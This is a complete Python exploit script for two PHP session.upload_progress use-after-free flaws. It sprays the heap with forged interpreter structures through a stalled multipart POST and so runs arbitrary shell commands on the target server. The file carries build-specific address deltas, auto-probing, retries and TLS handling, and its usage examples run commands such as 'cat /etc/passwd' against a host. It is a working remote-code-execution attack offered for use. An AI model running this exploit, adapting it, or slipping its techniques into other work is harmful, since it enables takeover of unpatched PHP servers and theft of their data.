#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — Heap UAF → Pure HTTP RCE

PHP session.upload_progress use-after-free via heap spray.
Single vulnerability, no SSH/GDB/LFI/.htaccess needed. Works on stock php.ini.

Requires:
  - zval_ptr_dtor runtime address (--dtor, from GDB or nm -D)
  - delta to zend_call_function (--delta, build-specific; omit to auto-probe)

Chain:
  1. Multipart POST with stall > min_freq (1s) triggers session re-decode
  2. Old session tree freed → cached zval* becomes stale (UAF)
  3. 149 t[] form fields (288B each) reclaim freed 320-byte heap bins
     with forged zend_fcall_info / zend_internal_function
  4. Stale pointer store → zend_call_function → system(cmd) → RCE

Variants:
  --bug 618: stale outer (post_bytes_processed), two files   [default]
  --bug 619: stale inner (current_file_bytes_processed), one file + 3 chunks

Address resolution:
  GDB:   (gdb) info address zval_ptr_dtor
         (gdb) info address zend_call_function
         delta = zval_ptr_dtor - zend_call_function

  nm:    nm -D /usr/lib/apache2/modules/libphp.so | grep -E 'zval_ptr_dtor|zend_call_function'

Known deltas (build-specific):
  0x43EF0   Ubuntu PHP 8.5.4
  0xC930    LiteSpeed lsphp82 8.2.34 (bookworm)
  0xCEF0    LiteSpeed lsphp82 8.2.34 (noble)
  0xD060    LiteSpeed lsphp82 8.2.34 (jammy)
  0xC2F0    PHP 8.2.34 cli
  0x2B273A  PHP 8.4.4 fpm (docker)

Patched: 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (2026-10-21).
"""

import argparse
import os
import socket
import ssl
import struct
import sys
import time
import uuid

MASK64 = 0xFFFFFFFFFFFFFFFF

# ── PHP internals constants ────────────────────────────────
FILLUNIT = 5120          # rfc1867.c FILLUNIT
N_SPRAY = 149            # packed table → nTableSize 256, reclaims 320B bins
BLOB_LEN = 288           # payload → 320-byte heap bin
FCI_SIZE = 64            # sizeof(zend_fcall_info)
IS_STRING_EX = 0x106     # IS_STRING | REFCOUNTED
IS_OBJECT_EX = 0x308     # IS_OBJECT | REFCOUNTED | COLLECTABLE
ZEND_INTERNAL = 1
TYPE_OFF = 16
PARAM_COUNT_OFF = 48
HANDLER_OFF = 152        # 64 + 88: zend_internal_function.handler
CMD_PLANT_OFF = 200      # "system\0<cmd>\0" location
CMD_MAX = 71             # max command length in forge

KNOWN_DELTAS = [
    (0x43EF0,  "Ubuntu PHP 8.5.4"),
    (0xC930,   "LiteSpeed lsphp82 8.2.34 bookworm"),
    (0xCEF0,   "LiteSpeed lsphp82 8.2.34 noble"),
    (0xD060,   "LiteSpeed lsphp82 8.2.34 jammy"),
    (0xC2F0,   "PHP 8.2.34 cli"),
    (0x2B273A, "PHP 8.4.4 fpm docker"),
]


# ── forge ──────────────────────────────────────────────────
def forge(call_addr, cmd_bytes):
    """288-byte fake zend_fcall_info + zend_internal_function + command."""
    buf = bytearray(BLOB_LEN)
    struct.pack_into("<Q", buf, 0, FCI_SIZE)
    struct.pack_into("<Q", buf, 8, call_addr)
    struct.pack_into("<I", buf, TYPE_OFF, IS_STRING_EX)
    struct.pack_into("<I", buf, PARAM_COUNT_OFF, 1)
    struct.pack_into("<B", buf, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", buf, HANDLER_OFF, call_addr)
    struct.pack_into("<I", buf, 160, IS_OBJECT_EX)
    plant = (b"system\x00" + cmd_bytes + b"\x00")[:80]
    buf[CMD_PLANT_OFF:CMD_PLANT_OFF + len(plant)] = plant
    return bytes(buf)


def wrap_cmd(cmd, marker):
    """Wrap command with marker for output detection."""
    s = f"{cmd}; echo {marker}"
    if len(s) > CMD_MAX:
        s = f"echo {marker}; {cmd}"
    if len(s) > CMD_MAX:
        keep = max(0, CMD_MAX - len(f"echo {marker}; ") - 1)
        print(f"    [!] cmd truncated to {keep} bytes (forge limit {CMD_MAX}B)")
        s = f"echo {marker}; {cmd[:keep]}"
    return s.encode("utf-8", "replace")


# ── multipart builder ──────────────────────────────────────
def part(boundary, name, data, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + data


def build_body(bug, boundary, sid, spray):
    """Build (phase1, tail) for two-phase stalled delivery."""
    if bug == 619:
        # stale INNER: 149 t[] FIRST, one file, 3 data chunks
        pre = part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
        pre += part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        for _ in range(N_SPRAY):
            pre += part(boundary, "t[]", spray) + b"\r\n"
        pre += part(boundary, "f", b"", filename="a") + b"\r\n"
        phase1 = pre + b"A" * (FILLUNIT + 64)
        tail = b"B" * (FILLUNIT + 64) + b"C" * (FILLUNIT + 64)
        tail += b"\r\n--" + boundary + b"--\r\n"
    else:
        # stale OUTER (618): file1, 149 t[] reclaim, file2
        pre = part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
        pre += part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        pre += part(boundary, "f", b"", filename="a") + b"\r\n"
        phase1 = pre + b"A" * (FILLUNIT + 64)
        tail = b"B" * (FILLUNIT + 64) + b"\r\n"
        for _ in range(N_SPRAY):
            tail += part(boundary, "t[]", spray) + b"\r\n"
        tail += part(boundary, "g", b"C" * 64, filename="b") + b"\r\n"
        tail += b"--" + boundary + b"--\r\n"
    return phase1, tail


# ── delivery ───────────────────────────────────────────────
def deliver(host, port, path, boundary, phase1, tail, sid,
            stall, use_tls, insecure, timeout):
    """Two-phase stalled delivery over raw socket."""
    total = len(phase1) + len(tail)
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {total}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    raw = socket.create_connection((host, port), timeout=40)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if use_tls:
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=host)
    else:
        sock = raw

    try:
        sock.sendall(header + phase1)
        print(f"    phase1 sent ({len(phase1)} bytes), stalling {stall}s ...")
        time.sleep(stall)
        sock.sendall(tail)
        print(f"    phase2 sent ({len(tail)} bytes), waiting for response ...")

        sock.settimeout(timeout)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
            except (socket.timeout, OSError):
                break
            if not chunk:
                break
            resp += chunk
        return resp
    finally:
        try:
            sock.close()
        except OSError:
            pass


def resp_status(raw):
    if raw:
        return raw.split(b"\r\n", 1)[0].decode("latin1", errors="replace")
    return "(empty)"


def resp_body(raw):
    if b"\r\n\r\n" in raw:
        return raw.split(b"\r\n\r\n", 1)[1]
    return raw


# ── address resolution ─────────────────────────────────────
def resolve_calls(dtor, call, delta):
    """Return list of (call_addr, label) candidates."""
    candidates = []
    if call:
        candidates.append((call, "explicit --call"))
    elif dtor:
        if delta:
            candidates.append(((dtor - delta) & MASK64,
                               f"--dtor - --delta 0x{delta:x}"))
        else:
            for d, label in KNOWN_DELTAS:
                candidates.append(((dtor - d) & MASK64,
                                   f"delta 0x{d:x} ({label})"))
    return candidates


# ── main ───────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618/619 — Heap UAF → Pure HTTP RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  python3 uaf_rce.py --host 10.0.0.1 --dtor 0x7f1234567890 --cmd id
  python3 uaf_rce.py --host 10.0.0.1 --dtor 0x7f1234567890 --delta 0x43ef0 --cmd id
  python3 uaf_rce.py --host 10.0.0.1 --call 0x7f1234500000 --cmd id --bug 619
  python3 uaf_rce.py --host 10.0.0.1 --port 443 --tls --dtor 0x51e410 --cmd "cat /etc/passwd"

address resolution:
  GDB:  (gdb) info address zval_ptr_dtor        → --dtor
        (gdb) info address zend_call_function    → compute delta
  nm:   nm -D libphp.so | grep -E 'zval_ptr_dtor|zend_call_function'

known deltas (build-specific, auto-probed if --delta omitted):
  0x43EF0   Ubuntu PHP 8.5.4
  0xC930    LiteSpeed lsphp82 8.2.34 bookworm
  0xCEF0    LiteSpeed lsphp82 8.2.34 noble
  0xD060    LiteSpeed lsphp82 8.2.34 jammy
  0xC2F0    PHP 8.2.34 cli
  0x2B273A  PHP 8.4.4 fpm docker
""")
    ap.add_argument("--host", default=os.environ.get("TARGET_HOST", "127.0.0.1"),
                    help="target host (env: TARGET_HOST)")
    ap.add_argument("--port", type=int,
                    default=int(os.environ.get("TARGET_PORT", "80")),
                    help="target port (env: TARGET_PORT)")
    ap.add_argument("--path", default="/index.php",
                    help="PHP endpoint path (default: /index.php)")
    ap.add_argument("--tls", action="store_true",
                    help="use HTTPS")
    ap.add_argument("--insecure", action="store_true",
                    help="skip TLS certificate verification")
    ap.add_argument("--bug", type=int, choices=[618, 619], default=618,
                    help="618=stale outer [default] | 619=stale inner")
    ap.add_argument("--dtor", help="runtime zval_ptr_dtor address (0x...)")
    ap.add_argument("--call", help="zend_call_function address (overrides --dtor)")
    ap.add_argument("--delta", help="zval_ptr_dtor - zend_call_function (0x...)")
    ap.add_argument("--cmd", default=os.environ.get("CMD", "id"),
                    help="command to execute (env: CMD, max 71 bytes)")
    ap.add_argument("--stall", type=float, default=1.4,
                    help="seconds between chunks (must > min_freq 1s, default 1.4)")
    ap.add_argument("--retries", type=int, default=3,
                    help="attempts per address candidate (default 3)")
    ap.add_argument("--timeout", type=float, default=25.0,
                    help="response timeout in seconds")
    args = ap.parse_args()

    if not args.dtor and not args.call:
        ap.error("need --dtor (zval_ptr_dtor address) or --call (zend_call_function address)")

    dtor = int(args.dtor, 0) if args.dtor else None
    call = int(args.call, 0) if args.call else None
    delta = int(args.delta, 0) if args.delta else None

    candidates = resolve_calls(dtor, call, delta)
    if not candidates:
        ap.error("cannot resolve zend_call_function address")

    use_tls = args.tls or args.port == 443
    marker = "UAF" + uuid.uuid4().hex[:8].upper()

    # ── banner ─────────────────────────────────────────────
    print("=" * 62)
    print(f"CVE-2026-109618/619  Heap UAF → Pure HTTP RCE  (bug={args.bug})")
    print(f"Target  {args.host}:{args.port}{args.path}"
          f"  {'HTTPS' if use_tls else 'HTTP'}")
    print(f"CMD: {args.cmd}   stall: {args.stall}s   retries: {args.retries}")
    if dtor:
        print(f"zval_ptr_dtor = 0x{dtor:x}")
    if delta:
        print(f"delta = 0x{delta:x}")
    elif not call:
        print(f"delta = auto-probe ({len(KNOWN_DELTAS)} known profiles)")
    print("=" * 62)

    # ── fire ───────────────────────────────────────────────
    for call_addr, label in candidates:
        for attempt in range(1, args.retries + 1):
            sid = "uaf" + uuid.uuid4().hex[:28]
            cmd_bytes = wrap_cmd(args.cmd, marker)
            spray = forge(call_addr, cmd_bytes)
            boundary = b"UAFx" + uuid.uuid4().hex[:12].encode()

            if boundary in spray:
                boundary = b"UAFy" + uuid.uuid4().hex[:12].encode()

            phase1, tail = build_body(args.bug, boundary, sid, spray)

            print(f"\n[{attempt}/{args.retries}] call=0x{call_addr:x}  ({label})")
            print(f"    sid={sid[:12]}...  spray={N_SPRAY}x{BLOB_LEN}B")

            resp = deliver(args.host, args.port, args.path,
                           boundary, phase1, tail, sid,
                           args.stall, use_tls, args.insecure, args.timeout)

            status = resp_status(resp)
            body = resp_body(resp)
            print(f"    {status}")

            if marker.encode() in body:
                idx = body.find(marker.encode())
                output = body[:idx].decode("utf-8", errors="replace")
                output = output[-4096:].rstrip()
                print("\n" + "=" * 62)
                print("-" * 62)
                print(output or "(command ran, no stdout captured)")
                print("-" * 62)
                print(f"  ★  RCE CONFIRMED  (bug={args.bug}, {label})")
                print(f"  ★  Pure HTTP, single vulnerability, stock php.ini")
                print("=" * 62)
                return 0

            if status.startswith(("502", "503", "504")):
                print("    [!] 5xx — worker likely crashed (wrong delta for this build)")
            else:
                print(f"    [-] no marker in response ({len(body)} bytes)")

        if len(candidates) > 1:
            print(f"    → trying next delta ...")

    # ── failure ────────────────────────────────────────────
    print("\n" + "=" * 62)
    print("  ✗  RCE not confirmed. Check:")
    print("     - target PHP version < 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35")
    print("     - --dtor is the RUNTIME address (ASLR changes it per restart)")
    print("     - try --bug 619 (the other stale-pointer variant)")
    print("     - verify delta: copy target binary → nm -D | grep zval_ptr_dtor")
    print("     - raise --stall if custom session.upload_progress.min_freq")
    print("=" * 62)
    return 1


if __name__ == "__main__":
    sys.exit(main())
